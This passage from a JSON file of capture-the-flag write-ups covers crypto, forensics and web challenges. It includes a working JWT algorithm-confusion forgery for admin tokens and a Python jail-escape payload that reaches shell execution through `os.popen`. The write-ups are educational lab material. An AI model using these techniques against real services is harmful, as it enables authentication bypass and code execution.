                "writeup": "<h3>Challenge Overview</h3>\n<p>We were provided with a binary named <code>nightmare</code> and a packet capture file <code>traffic.pcap</code>. The premise is that the binary \"messed up\" the network traffic, specifically related to web browsing (DNS). The goal is to recover the visited websites/flag from the capture.</p>\n<h3>Analysis</h3>\n<h4>Binary Analysis (<code>nightmare</code>)</h4>\n<ol>\n<li><strong>Initial Inspection</strong>: Using <code>file</code> and <code>strings</code>, we identified it as a 64-bit ELF executable dynamically linked with <code>libnetfilter_queue</code>. This library allows userspace programs to handle packets queued by the kernel packet filter.</li>\n<li><strong>Disassembly</strong>: Disassembling the binary revealed the main loop handling packets.</li>\n</ol>\n<ul>\n<li>It binds to a netfilter queue.</li>\n<li>It processes UDP packets (specifically checking for port 53/DNS structure).</li>\n<li>It iterates through the DNS query name.</li>\n</ul>\n<ol>\n<li><strong>Obfuscation Logic</strong>: The assembly logic showed an XOR operation being applied to the payload.</li>\n</ol>\n<ul>\n<li>The key for the XOR operation is 4 bytes long.</li>\n<li>The key is derived dynamically from the packet headers:</li>\n<li>Byte 0: UDP Source Port (Lower 8 bits)</li>\n<li>Byte 1: UDP Source Port (Upper 8 bits)</li>\n<li>Byte 2: DNS Transaction ID (Lower 8 bits)</li>\n<li>Byte 3: DNS Transaction ID (Upper 8 bits)</li>\n<li>The obfuscation is symmetric (XOR), so applying the same operation decrypts the data.</li>\n</ul>\n<h4>PCAP Analysis (<code>traffic.pcap</code>)</h4>\n<p>The pcap file contained DNS traffic with unintelligible query names (e.g., hex strings or garbage characters). However, the UDP and DNS headers (Source Port and Transaction ID) were intact.</p>\n<h3>Solution</h3>\n<p>To recover the original domains, we wrote a script to:</p>\n<ol>\n<li>Parse <code>traffic.pcap</code> using <code>tshark</code>.</li>\n<li>Extract the <strong>UDP Source Port</strong>, <strong>DNS Transaction ID</strong>, and the <strong>Obfuscated Query Name</strong> for each DNS packet.</li>\n<li>Reconstruct the 4-byte XOR key for each packet: <code>[SrcPort_Lo, SrcPort_Hi, TransID_Lo, TransID_Hi]</code>.</li>\n<li>XOR the bytes of the obfuscated query name with this key.</li>\n</ol>\n<h4>Decrypted Output</h4>\n<p>Running the decryption script revealed several standard domains (google.com, github.com, etc.) and a series of specific domains that formed the flag:</p>\n<ol>\n<li><code>nullctf{dns_.ro</code></li>\n<li><code>is_br0k3n_.ro</code></li>\n<li><code>why_is_i7.ro</code></li>\n<li><code>_4lw4ys_dns}.ro</code></li>\n</ol>\n<p>Combining these gives the final flag.</p>\n<h3>Flag</h3>\n<p><code>nullctf{dns_is_br0k3n_why_is_i7_4lw4ys_dns}</code></p>"
            },
            {
                "id": "next-jason",
                "title": "Next Jason",
                "category": "Web Exploitation",
                "tags": [
                    "cookie",
                    "jwt"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>The challenge provided a Next.js application implementing JWT-based authentication. The goal was to retrieve a flag protected by an admin check.                                                                                                                                    ## Vulnerabilities Identified</p>\n<h4>1. Insecure Middleware Scope & Logic</h4>\n<p>The <code>middleware.js</code> file was configured to match only <code>/api/:path*</code> routes:</p>\n<pre><code class=\"javascript\">\nexport const config = {                                                                         matcher: '/api/:path*',\n\n};\n\n</code></pre>\n<h4>2. JWT Algorithm Confusion                                                              The verification logic in <code>app/token/verify/route.js</code> insecurely allowed multiple algorithms:</h4>\n<pre><code class=\"javascript                                                                               function verifyToken(token) {\">\n    return jwt.verify(token, PUBKEY, { algorithms: ['RS256', 'HS256'] });\n\n}\n\n</code></pre>\n<p>The server uses a Public Key (<code>PUBKEY</code>) to verify tokens. Standard tokens are signed with a Private Key using <code>RS256</code>. However, by allowing <code>HS256</code> (HMAC with SHA-256), the library treats the key provided (<code>PUBKEY</code>) as a *symmetric secret*.</p>\n<p>This allows an attacker to sign a malicious token using <code>HS256</code> and the *Public Key* as the secret. The server, validating with the same Public Key and allowing <code>HS256</code>, will verify the signature as valid.</p>\n<h3>Exploit Chain</h3>\n<ol>\n<li><strong>Obtain Valid \"Guest\" Token</strong></li>\n</ol>\n<ul>\n<li>We bypassed the middleware protection by hitting the exposed <code>/token/sign</code> endpoint.</li>\n<li><strong>Payload:</strong> <code>{\"username\": \"guest\"}</code></li>\n<li><strong>Result:</strong> A valid RS256 signed token.</li>\n</ul>\n<ol>\n<li><strong>Retrieve Public Key</strong></li>\n</ol>\n<ul>\n<li>The endpoint <code>/api/getPublicKey</code> is protected by middleware but allows access to users with a valid token.</li>\n<li>We sent a request to <code>/api/getPublicKey</code> with the valid \"guest\" token in the cookies.</li>\n<li><strong>Result:</strong> The server returned its Public Key.</li>\n</ul>\n<ol>\n<li><strong>Forge Admin Token</strong></li>\n</ol>\n<ul>\n<li>We created a new JWT with the payload <code>{\"username\": \"admin\"}</code>.</li>\n<li>We signed this token using the <strong>HS256</strong> algorithm, using the retrieved <strong>Public Key</strong> as the secret key.</li>\n<li>Code snippet:</li>\n</ul>\n<p>``<code>javascript      jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });      </code>``</p>\n<ol>\n<li><strong>Retrieve Flag</strong></li>\n</ol>\n<ul>\n<li>We sent the forged admin token to <code>/api/getFlag</code>.</li>\n<li>The server verified the token (believing it to be valid because the signature matched the Public Key processed as an HMAC secret) and saw <code>username: \"admin\"</code>.</li>\n<li><strong>Result:</strong> The server returned the flag.</li>\n</ul>\n<h3>Flag</h3>\n<p><code>nullctf{f0rg3_7h15_cv3_h3h_a44452394d983966}</code></p>"
            },
            {
                "id": "reservation",
                "title": "Reservation",
                "category": "Web Exploitation",
                "tags": [],
                "writeup": "<p>The challenge involves a simple TCP server that asks for a \"secret passphrase received from the environment\". The Python source code (reservation.py) reveals that the server compares the user input against an environment variable named PROMPT.</p>\n<p>PROMPT = os.getenv(\"PROMPT\", \"bananananannaanan\") ... if response == PROMPT:     client_socket.sendall(b\"Thank you for your patience. Here is your flag: \" + FLAG.encode())</p>\n<p>The server's banner ([windows_10 | cmd.exe]) and a curious comment in the source code about the WINDIR environment variable (<code># This is missing from the .env file, but it still printed something, interesting</code>) strongly hint that the server is running on a Windows environment, or an environment designed to emulate Windows environment variables.</p>\n<p>On Windows systems, the default value for the PROMPT environment variable is $P$G (which stands for current Path + Greater-than symbol).</p>\n<p>Therefore, sending \"$P$G\" as the passphrase satisfies the server's check and returns the flag.</p>\n<p>Flag: nullctf{why_1s_it_r3srv3d_ceed3c0e6c3d10c3}</p>"
            },
            {
                "id": "witching-hour",
                "title": "Witching Hour",
                "category": "Cryptography",
                "tags": [
                    "cipher",
                    "xor"
                ],
                "writeup": "<h3>Challenge Analysis</h3>\n<p>We are provided with a generation script <code>gen.py</code> that implements a curve based on a hidden parameter <code>a</code>. The parameter <code>a</code> is a fraction <code>n/d</code> where <code>n</code> and <code>d</code> are generated as random 2048-bit primes. The script calculates points <code>(x, y)</code> using the formula: y = a^3 / (x^2 + a^2)</p>\n<p>This is the standard equation for the <strong>Witch of Agnesi</strong> curve.</p>\n<h3>Derivation</h3>\n<p>Let's substitute <code>a = n/d</code> into the equation:</p>\n<p>y = (n/d)^3 / (x^2 + (n/d)^2)   = (n^3 / d^3) / (x^2 + n^2 / d^2)</p>\n<p>Multiply numerator and denominator by <code>d^2</code> to simplify the lower fraction: y = (n^3 / d^3) / ((x^2 * d^2 + n^2) / d^2)   = (n^3 * d^2) / (d^3 * (x^2 * d^2 + n^2))   = n^3 / (d * (x^2 * d^2 + n^2))   = n^3 / (x^2 * d^3 + n^2 * d)</p>\n<p>So we have the point <code>y</code> represented as a fraction: Numerator: <code>n^3</code> Denominator: <code>x^2 * d^3 + n^2 * d</code></p>\n<p>Since <code>n</code>, <code>d</code>, and <code>x</code> are distinct large primes, <code>gcd(n^3, x^2 * d^3 + n^2 * d) == 1</code> is almost guaranteed. This means the fraction given in <code>points.txt</code> is already in its simplest form (irreducible).</p>\n<h3>Solution Strategy</h3>\n<ol>\n<li><strong>Recover <code>n</code></strong>:</li>\n</ol>\n<p>From <code>points.txt</code>, take the numerator of <code>y</code>.    n = cubic_root(y_numerator)</p>\n<ol>\n<li><strong>Recover <code>d</code></strong>:</li>\n</ol>\n<p>From <code>points.txt</code>, take the denominator of <code>y</code> (let's call it <code>Y_den</code>).    We know: <code>Y_den = x^2 * d^3 + n^2 * d</code>    Rearranging this gives us a cubic equation for <code>d</code>:    <code>x^2 * d^3 + n^2 * d - Y_den = 0</code></p>\n<p>Since <code>f(d) = x^2 * d^3 + n^2 * d - Y_den</code> is strictly increasing for <code>d &gt; 0</code>, we can easily find the unique positive integer root <code>d</code> using binary search.</p>\n<ol>\n<li><strong>Decrypt</strong>:</li>\n</ol>\n<p>Reconstruct the key string <code>a = \"n/d\"</code>.    The key is <code>sha256(a).digest()</code>.    XOR the ciphertext from <code>ciphertext.hex</code> with this key (repeating) to reveal the flag.</p>\n<h3>Flag</h3>\n<p><code>nullctf{I_w0nder_wh0_!s_th3_w!tch_0f_Agn3s!?_6920686f7065207468652063746620776173206e696365}</code></p>"
            },
            {
                "id": "abcdef",
                "title": "abcdef",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We are presented with a Python jail (<code>jail.py</code>) running on a server. The jail accepts user input and executes it using <code>eval()</code>, but enforces an extremely strict character filter via the <code>is_valid()</code> function.</p>\n<h4>Constraints</h4>\n<ol>\n<li><strong>Allowed Characters:</strong> 'a', 'b', 'c', 'd', 'e', 'f' (case-insensitive).</li>\n<li><strong>Allowed Extras:</strong> Digits (0-9) and all printable ASCII symbols (e.g., <code>_</code>, <code>.</code>, <code>(</code>, <code>)</code>, <code>[</code>, <code>]</code>, <code>{</code>, <code>}</code>).</li>\n<li><strong>Forbidden:</strong> All other alphabetic characters (g-z).</li>\n<li><strong>Escapes:</strong> <code>\\x</code> escapes are effectively banned because 'x' is a forbidden character.</li>\n</ol>\n<h4>The Code</h4>\n<pre><code class=\"python\">\nabcdef = set(\"abcdef\")\n\n\n\ndef is_valid(text):\n\n    for c in text:\n\n        # ... (ascii checks)\n\n        if c.isalpha() and c not in abcdef:\n\n            return False\n\n    return True\n\n# ... loop with input() and eval()\n\n</code></pre>\n<h3>Solution Analysis</h3>\n<p>The core vulnerability lies in the fact that <code>abcdef</code> is a mutable <code>set</code> available in the global scope. If we can add characters to this set, the <code>is_valid</code> function will allow them in subsequent inputs.</p>\n<p>To call <code>abcdef.add(char)</code>, we need a reference to the character <code>char</code>. Since we cannot type forbidden characters directly, we must \"harvest\" them from existing objects available in the environment using only allowed syntax.</p>\n<h4>Harvesting Characters</h4>\n<p>We can generate strings containing forbidden characters by taking the representation (<code>repr</code> or <code>str</code>) of available objects.</p>\n<ul>\n<li><code>abcdef.add</code> is a built-in method.</li>\n<li><code>f\"{abcdef.add}\"</code> evaluates to a string like: <code>&lt;built-in method add of set object at 0x...&gt;</code></li>\n<li><code>(1).__add__</code> is a method wrapper.</li>\n<li><code>f\"{(1).__add__}\"</code> evaluates to a string like: <code>&lt;method-wrapper '__add__' of int object at 0x...&gt;</code></li>\n</ul>\n<p>These strings contain the characters <code>i</code>, <code>m</code>, <code>p</code>, <code>o</code>, <code>r</code>, <code>t</code>, <code>s</code>, <code>n</code> needed to construct <code>print</code>, <code>__import__</code>, <code>os</code>, and <code>popen</code>.</p>\n<p>By calculating the index of each character in these strings, we can extract them. For example, <code>f\"{abcdef.add}\"[3]</code> is 'i'.</p>\n<h4>Step 1: The Jailbreak Payload</h4>\n<p>We construct a list of <code>abcdef.add(...)</code> calls. This payload itself only uses <code>a-f</code>, digits, and symbols.</p>\n<pre><code class=\"python\">\n[\n\n    abcdef.add(f\"{abcdef.add}\"[3]),   # i\n\n    abcdef.add(f\"{abcdef.add}\"[10]),  # m\n\n    abcdef.add(f\"{(1).__add__}\"[11]), # p\n\n    abcdef.add(f\"{abcdef.add}\"[14]),  # o\n\n    abcdef.add(f\"{(1).__add__}\"[9]),  # r\n\n    abcdef.add(f\"{abcdef.add}\"[5]),   # t\n\n    abcdef.add(f\"{abcdef.add}\"[24]),  # s\n\n    abcdef.add(f\"{abcdef.add}\"[8])    # n\n\n]\n\n</code></pre>\n<p><strong>Minified Input 1:</strong></p>\n<pre><code class=\"python\">\n[abcdef.add(f\"{abcdef.add}\"[3]),abcdef.add(f\"{abcdef.add}\"[10]),abcdef.add(f\"{(1).__add__}\"[11]),abcdef.add(f\"{abcdef.add}\"[14]),abcdef.add(f\"{(1).__add__}\"[9]),abcdef.add(f\"{abcdef.add}\"[5]),abcdef.add(f\"{abcdef.add}\"[24]),abcdef.add(f\"{abcdef.add}\"[8])]\n\n</code></pre>\n<h4>Step 2: Arbitrary Code Execution</h4>\n<p>Once the characters are added to <code>abcdef</code>, the <code>is_valid</code> function allows us to use them. We can now write standard Python code to read the flag. We use <code>print</code> because <code>eval</code> doesn't display output automatically in this loop.</p>\n<p><strong>Input 2:</strong></p>\n<pre><code class=\"python\">\nprint(__import__('os').popen('cat f*').read())\n\n</code></pre>\n<h3>Flag</h3>\n<p><code>nullctf{g!bb3r!sh_d!dnt_st0p_y0u!}</code></p>"
            },
            {
                "id": "double_it_and_give_it_to_the_next_person",
                "title": "double_it_and_give_it_to_the_next_person",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "image"
                ],
                "writeup": "<h4>Challenge Overview</h4>\n<p>The challenge provides a source script <code>chal.sage</code> and an output file <code>output.txt</code>. The script implements a cryptographic scheme using the NIST P-256 elliptic curve. It generates two secret scalars, <code>key1</code> and <code>key2</code>, and then runs two iterations of a process where it:</p>\n<ol>\n<li>Generates a random point P.</li>\n</ol>\n<ol>\n<li>Computes Q=2P (point doubling).</li>\n</ol>\n<ul>\n<li>Obfuscates the x-coordinates of P and Q using linear equations involving the secret keys and random coefficients.</li>\n</ul>\n<p>The goal is to recover <code>key1</code> and <code>key2</code> to construct the flag: <code>nullctf{key1 ^ key2}</code>.</p>\n<h4>Analysis</h4>\n<h5>1. The Source Code</h5>\n<p>The script uses the standard NIST P-256 curve where a=\u22123. For each iteration, the output gives us:</p>\n<ul>\n<li>P.x=a\u22c5key1+b</li>\n</ul>\n<ul>\n<li>Q.x=c\u22c5key2+d</li>\n</ul>\n<p>We are given two sets of these equations (from two iterations). Let's denote the known coefficients for iteration i as Ai\u200b,Bi\u200b,Ci\u200b,Di\u200b. Thus:</p>\n<p>xPi\u200b\u200b=Ai\u200b\u22c5k1\u200b+Bi\u200b</p>\n<p>xQi\u200b\u200b=Ci\u200b\u22c5k2\u200b+Di\u200b</p>\n<h5>2. The Vulnerability: Point Doubling</h5>\n<p>The core weakness lies in the mathematical relationship between P and Q. Since Q=2P, the x-coordinate of Q is determined solely by the x-coordinate of P (and the curve parameters).</p>\n<p>The formula for point doubling on a curve y2=x3+ax+b provides the x-coordinate of Q:</p>\n<p>xQ\u200b=(2yP\u200b3xP2\u200b+a\u200b)2\u22122xP\u200b</p>\n<p>We can eliminate the yP\u200b term by substituting the curve equation yP2\u200b=xP3\u200b+axP\u200b+b:</p>\n<p>xQ\u200b=4(xP3\u200b+axP\u200b+b)(3xP2\u200b+a)2\u200b\u22122xP\u200b</p>\n<p>This rational function relates xQ\u200b entirely to xP\u200b.</p>\n<h4>Solution Strategy</h4>\n<ol>\n<li><strong>Express k2\u200b in terms of k1\u200b:</strong> Substitute the linear equations into the doubling formula. Since xP\u200b depends only on k1\u200b and xQ\u200b depends only on k2\u200b, we can rearrange the doubling formula to isolate k2\u200b.</li>\n</ol>\n<p>Ci\u200b\u22c5k2\u200b+Di\u200b=DoublingFormula(Ai\u200b\u22c5k1\u200b+Bi\u200b)</p>\n<p>k2\u200b=Ci\u200bDoublingFormula(Ai\u200b\u22c5k1\u200b+Bi\u200b)\u2212Di\u200b\u200b</p>\n<ol>\n<li><strong>Equate and Solve:</strong> Since k1\u200b and k2\u200b are constant across iterations, the value of k2\u200b derived from iteration 0 must equal the value derived from iteration 1.</li>\n</ol>\n<p>k2\u200b(from\u00a0iter\u00a00)=k2\u200b(from\u00a0iter\u00a01)</p>\n<p>This creates a polynomial equation with a single unknown, k1\u200b.</p>\n<ol>\n<li><strong>Root Finding:</strong> The resulting polynomial is of degree 7 (due to the cubic terms in the curve equation squared). We can solve for the roots of this polynomial over the finite field GF(p) to find k1\u200b.</li>\n</ol>\n<h4>Solution Script</h4>\n<p>The following SageMath script implements the algebra described above.</p>\n<p><strong>Note:</strong> If running on a system without SageMath (like a minimal Fedora install), this can be run via Docker/Podman using the <code>sagemath/sagemath</code> image.</p>\n<p>Python</p>\n<pre><code class=\"python\">\nfrom sage.all import *\n\n\n\n# P-256 Curve Parameters\n\np = 2**256 - 2**224 + 2**192 + 2**96 - 1\n\na_curve = -3\n\nb_curve = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b\n\n\n\n# Data parsed from output.txt\n\n# Iteration 0\n\nA0 = 101391067652419278504279072061964396163420598174591672104811496061093042423713\n\nB0 = 110183945624921546387413554986656742713737778649772602611818367446708850272293\n\nC0 = 43935985468030112938420167350551592897480789520688041577831275174910738854569\n\nD0 = 13245902077735905939963311540878792271896625592735457462639747889134751588655\n\n\n\n# Iteration 1\n\nA1 = 113113920295449343615508981422751944711310245958533784150505930220126533492423\n\nB1 = 3292039546575820821367398987680176504505470559384412397685623175088154966631\n\nC1 = 90189751456536603500768763858048652235807590023038279530146107092251468907921\n\nD1 = 93980984745553841375952018332854663310402153214300203815947697055365029221289\n\n\n\n# 1. Setup Ring\n\nF = GF(p)\n\nR = PolynomialRing(F, 'x')\n\nx = R.gen() # x represents the unknown key1\n\n\n\ndata = [(A0, B0, C0, D0), (A1, B1, C1, D1)]\n\nnumerators = []\n\ndenominators = []\n\n\n\nprint(\"[*] Constructing polynomials...\")\n\nfor A, B, C, D in data:\n\n    # xP expressed in terms of key1 (x)\n\n    xP = A * x + B\n\n    \n\n    # Calculate yP^2 from curve equation\n\n    yP_sq = xP**3 + a_curve * xP + b_curve\n\n    \n\n    # Doubling formula relation: \n\n    # xQ = ((3xP^2 + a)^2) / (4yP^2) - 2xP\n\n    # Substituting xQ = C*k2 + D and rearranging for k2:\n\n    # k2 = [ (3xP^2 + a)^2 - (8xP + 4D)*yP^2 ] / [ 4*C*yP^2 ]\n\n    \n\n    term_num = (3*xP**2 + a_curve)**2 - (8*xP + 4*D) * yP_sq\n\n    term_den = 4 * C * yP_sq\n\n    \n\n    numerators.append(term_num)\n\n    denominators.append(term_den)\n\n\n\n# 2. Equate the two expressions for k2\n\n# num0 / den0 = num1 / den1  =&gt;  num0 * den1 - num1 * den0 = 0\n\nfinal_poly = numerators[0] * denominators[1] - numerators[1] * denominators[0]\n\n\n\nprint(\"[*] Finding roots (candidates for key1)...\")\n\nroots = final_poly.roots()\n\n\n\nfor r, multiplicity in roots:\n\n    try:\n\n        k1_candidate = r\n\n        \n\n        # Recover key2 using the first iteration\n\n        num = numerators[0](k1_candidate)\n\n        den = denominators[0](k1_candidate)\n\n        \n\n        if den == 0: continue\n\n        k2_candidate = num / den\n\n        \n\n        # Calculate Flag\n\n        val_k1 = int(k1_candidate)\n\n        val_k2 = int(k2_candidate)\n\n        flag_val = val_k1 ^ val_k2\n\n        \n\n        print(f\"Flag: nullctf{{{flag_val:064x}}}\")\n\n        break\n\n    except Exception as e:\n\n        print(f\"Error: {e}\")\n\n</code></pre>\n<h3>Flag: nullctf{25b6b8151d54b7f9e5fc3181e1d5b5a97464d019dde57aca90df349a8c951a02}</h3>"
            },
            {
                "id": "iuesbitaipsi",
                "title": "iuesbitaipsi",
                "category": "Forensics",
                "tags": [
                    "pcap",
                    "shark"
                ],
                "writeup": "<ol>\n<li><strong>Initial Reconnaissance:</strong> I started by examining the provided files, <code>nullctf.pcapng</code> and <code>README.md</code>. The <code>README.md</code> was empty.</li>\n</ol>\n<ol>\n<li><strong>Pcapng Analysis with tshark:</strong> I identified <code>nullctf.pcapng</code> as a packet capture file. Initial <code>tshark</code> commands (<code>tshark -r nullctf.pcapng | head -n 10</code>) showed USB traffic.</li>\n</ol>\n<p><code>tshark -r nullctf.pcapng -q -z conv,usb</code> revealed significant data transfer on USB device address 5 (endpoints 1.5.1 and 1.5.4), indicating potential HID (Human Interface Device) or mass storage activity.</p>\n<ol>\n<li><strong>Troubleshooting tshark Data Extraction:</strong> Multiple attempts to extract raw data or specific fields using <code>tshark</code> (e.g., <code>usb.capdata</code>, <code>usb.hid.data</code>, <code>-x</code>, <code>-T json</code>) to various output files consistently resulted in empty files, despite the <code>pcapng</code> being 13MB in size. This suggested an issue with <code>tshark</code>'s file output or a specific nuance of this <code>pcapng</code> file that prevented standard extraction.</li>\n</ol>\n<ol>\n<li><strong>Identifying the Data Type:</strong> Given the USB traffic and large data volume, it was highly probable that the flag was hidden within HID keyboard input (scancodes).</li>\n</ol>\n<ol>\n<li><strong>Scapy for USB HID Decoding:</strong> Since <code>tshark</code> was problematic for extraction, I decided to use <code>scapy</code>, a powerful Python packet manipulation library.</li>\n</ol>\n<ul>\n<li>I first checked for <code>scapy</code> installation (<code>python3 -c \"import scapy.all\"</code>), which showed it was not installed.</li>\n<li>I installed <code>scapy</code> using <code>pip install scapy</code>.</li>\n</ul>\n<ol>\n<li><strong>Python Script Development:</strong> I developed a Python script (<code>extract_usb_hid.py</code>) to:</li>\n</ol>\n<ul>\n<li>Load the <code>nullctf.pcapng</code> file using <code>scapy.all.rdpcap</code>.</li>\n<li>Iterate through packets, filtering for <code>USBpcap</code> layers that also contained a <code>Raw</code> layer (indicating data).</li>\n<li>Heuristically identified 8-byte <code>Raw</code> payloads as potential HID keyboard reports.</li>\n<li>Parsed the modifier byte (byte 0) and scancode byte (byte 2) from these reports.</li>\n<li>Implemented a <code>scancode_map</code> to convert USB HID scancodes to ASCII characters, handling both unshifted and shifted key presses.</li>\n</ul>\n<ol>\n<li><strong>Script Debugging:</strong></li>\n</ol>\n<ul>\n<li>Initially, the script had a <code>SyntaxError</code> due to an unescaped backslash in the <code>scancode_map</code>, which was corrected.                                                                 *   Next, <code>ImportError: cannot import name 'USBPcap' from 'scapy.all'</code> occurred. I corrected the import to <code>from scapy.layers.usb import USBPcap</code>.</li>\n<li>Another <code>ImportError</code> revealed a case sensitivity issue: the correct import was <code>from scapy.layers.usb import USBpcap</code> (lowercase 'p'), which was then also applied to <code>packet.haslayer(USBpcap)</code>.</li>\n</ul>\n<ol>\n<li><strong>Flag Extraction:</strong> After correcting the Python script, executing <code>python3 extract_usb_hid.py nullctf.pcapng</code> successfully outputted a string. The first part of the output clearly resembled a flag format: <code>nullctf{4nd_7h47s_h0w_4_k3yl0gg3r_w0rks}</code>. The remaining characters were likely noise from imperfect scancode mapping or other key events not directly relevant to the flag.</li>\n</ol>\n<p>The flag is: <code>nullctf{4nd_7h47s_h0w_4_k3yl0gg3r_w0rks}</code></p>"
            }
        ]
    },
    "MetaRed CTF 2025": {
        "rank": "66th place",
        "description": "Specialized competition focusing on red team operations and offensive security techniques.",
        "challenges": [
            {
                "id": "21-blackjack",
                "title": "21 Blackjack",
                "category": "Beginner",
                "tags": [],
                "writeup": "<h3>Initial Observations</h3>\n<p>Relevant code portion:</p>\n<pre><code class=\"\">\n\n\nbet = float(input(\"Enter your bet amount: \").strip())\n\nif bet &gt; coins:     \n\n\tprint(\"Invalid bet.\")     \n\n\tcontinue  ...  \n\nif guess == winning:     \n\n\tcoins += bet * 2 \n\nelse:     \n\n\tcoins -= bet\n\n</code></pre>\n<p>There is <strong>no validation</strong> that the bet must be positive.</p>\n<p>---</p>\n<h3>Vulnerability Analysis</h3>\n<p>The game checks:</p>\n<p><code>if bet &gt; coins:</code></p>\n<p>but <strong>does not check for negative values</strong>, allowing bets such as:</p>\n<p><code>-99999999999</code></p>\n<p>If the guess is wrong (which is extremely likely because the range is 0\u20131,000,000):</p>\n<p><code>coins -= bet</code></p>\n<p>If bet is negative:</p>\n<p><code>coins = coins - (-99999999999)</code> <code>coins = coins + 99999999999</code></p>\n<p>This results in the balance skyrocketing instead of decreasing.</p>\n<p>---</p>\n<h3>Exploitation</h3>\n<h4>Step 1 \u2014 Start Game</h4>\n<p><code>python3 21blackjack.py</code></p>\n<h4>Step 2 \u2014 Choose Play</h4>\n<p><code>1</code></p>\n<h4>Step 3 \u2014 Use Negative Bet</h4>\n<p><code>Enter your bet: -99999999999</code> <code>Enter your guess: 1</code></p>\n<h4>Step 4 \u2014 Intentionally Lose</h4>\n<p>You almost certainly lose, causing coins to increase drastically.</p>\n<h4>Step 5 \u2014 Buy Flag</h4>\n<p><code>2</code></p>\n<p>---</p>\n<h3>\ud83c\udfaf Flag</h3>\n<p><code>UNLP{IlovethisTown.ILoveThisGameAnd,Jim,IMightEvenLoveYou}</code></p>"
            },
            {
                "id": "antichrist",
                "title": "Antichrist",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "cipher",
                    "xor"
                ],
                "writeup": "<p>This challenge consisted of three levels of cryptographic puzzles, building upon each other.</p>\n<p>--- Level 1: Repeating XOR Key ---</p>\n<p>Initial analysis of the provided <code>certunlp_2025_crypto_antichrist.txt</code> file revealed several plaintext-ciphertext pairs, with ciphertexts represented in hexadecimal.</p>\n<p>Example pairs:</p>\n<ul>\n<li>\"How are you?\": <code>040e0553371d0b740b06104d</code></li>\n<li>\"How old are you?\": <code>040e055339030a74131b0052350e074c</code></li>\n<li>etc.</li>\n</ul>\n<p>The lengths of the plaintexts matched the byte lengths of their respective hex ciphertexts, strongly suggesting a repeating XOR cipher. To find the key, I performed an XOR operation between each plaintext and its corresponding ciphertext (<code>Key = Plaintext XOR Ciphertext</code>).</p>\n<p>Python script <code>analyze_keys.py</code>:</p>\n<pre><code class=\"python\">\ndef xor_bytes(a, b):\n\n    return bytes([x ^ y for x, y in zip(a, b)])\n\n\n\nexamples = [\n\n    (b\"How are you?\", bytes.fromhex(\"040e0553371d0b740b06104d\")),\n\n    (b\"How old are you?\", bytes.fromhex(\"040e055339030a74131b0052350e074c\")),\n\n    (b\"Plaintext\", bytes.fromhex(\"1c0d131a381b0b2c06\")),\n\n    (b\"You already understood where it goes\", bytes.fromhex(\"150e075337031c31130d1c52390f1616241c1a3b1d0d45052404001676061a741506000173\")),\n\n    (b\"Last example\", bytes.fromhex(\"00000107760a16351f190917\")),\n\n]\n\n\n\nfor i, (p, c) in enumerate(examples):\n\n    key = xor_bytes(p, c)\n\n    print(f\"Key {i}: {key.hex()}\")\n\n    try:\n\n        print(f\"Key {i} (text): {key}\")\n\n    except:\n\n        pass\n\n</code></pre>\n<p>Running this script revealed a repeating key: <code>LarsVonTrier</code>.</p>\n<p>--- Level 2: Decrypting with the Repeating XOR Key ---</p>\n<p>The challenge then presented a long hexadecimal string as \"Level 2\" ciphertext. Using the identified key \"LarsVonTrier\", I decrypted this ciphertext.</p>\n<p>Python script <code>solve_level2.py</code>:</p>\n<pre><code class=\"python\">\ndef xor_decrypt(ciphertext, key):\n\n    decrypted = bytearray()\n\n    key_len = len(key)\n\n    for i, byte in enumerate(ciphertext):\n\n        decrypted.append(byte ^ key[i % key_len])\n\n    return decrypted\n\n\n\nwith open(\"certunlp_2025_crypto_antichrist.txt\", \"r\") as f:\n\n    content = f.read()\n\n\n\nparts = content.split(\"Now decrypt level 2:\\n\")\n\nhex_cipher = parts[1].strip().replace(\"\\n\", \"\")\n\nciphertext = bytes.fromhex(hex_cipher)\n\n\n\nkey = b\"LarsVonTrier\"\n\n\n\nplaintext = xor_decrypt(ciphertext, key)\n\nprint(plaintext.decode('utf-8', errors='replace'))\n\n</code></pre>\n<p>The decrypted text for Level 2 provided instructions for \"Nivel 3\" and new plaintext-ciphertext pairs.</p>\n<p>Decrypted Level 2 output:</p>\n<pre><code class=\"\">\nNice Job. Next:\n\n\n\nLars Von Trier: e78e3e12b5ab712afa912317ed8a\n\nLara Croft: e78e3e00b5ac6c2ca1b7\n\nLa vida es bella: e78e6c17ae9c6453aacf2142efc1284f\n\nEl padrino: ee83651caf977611b391\n\nEl gran hotel budapest!: ee83650bbc85794abaca6540a28f6b15a49b7f11a78a2d\n\n\n\nNivel 3: e5862d0ca7c344499dc31645ce8a1c0ac297491e8e904245c9ec2f4ccfd8294de5c4275dbdda234fefda295dddea0563c7f43f66\n\n</code></pre>\n<p>--- Level 3: Autokey-like Cipher ---</p>\n<p>The new plaintext-ciphertext pairs for Level 3 indicated a more complex encryption. Initial attempts to find a simple repeating XOR key failed, as the derived keys varied.</p>\n<p>Analyzing the relationship <code>C[i] = P[i] XOR K[i]</code> for each pair:</p>\n<ul>\n<li>The first two bytes of the derived key (<code>K[0]</code>, <code>K[1]</code>) were consistently <code>0xab</code> and <code>0xef</code> across all examples.</li>\n<li><code>K[0] = P[0] XOR C[0]</code></li>\n<li><code>K[1] = P[1] XOR C[1]</code></li>\n<li>For <code>i &gt;= 2</code>, a pattern emerged where <code>K[i]</code> seemed to be derived from a previous ciphertext byte XORed with one of the initial key bytes. Specifically, <code>K[i] = C[i-2] XOR K[i % 2]</code>.</li>\n</ul>\n<p>This led to the full encryption/decryption algorithm:</p>\n<p>Decryption algorithm for Level 3:</p>\n<ul>\n<li>For <code>i = 0</code>: <code>P[0] = C[0] XOR 0xab</code></li>\n<li>For <code>i = 1</code>: <code>P[1] = C[1] XOR 0xef</code></li>\n<li>For <code>i &gt;= 2</code>: <code>P[i] = C[i] XOR (C[i-2] XOR (0xab if i is even else 0xef))</code></li>\n</ul>\n<p>Python script <code>solve_level3.py</code>:</p>\n<pre><code class=\"python\">\ndef decrypt_level3(hex_cipher):\n\n    ciphertext = bytes.fromhex(hex_cipher)\n\n    plaintext = bytearray()\n\n\n\n    k0 = 0xab # Constant for even indices\n\n    k1 = 0xef # Constant for odd indices\n\n\n\n    for i in 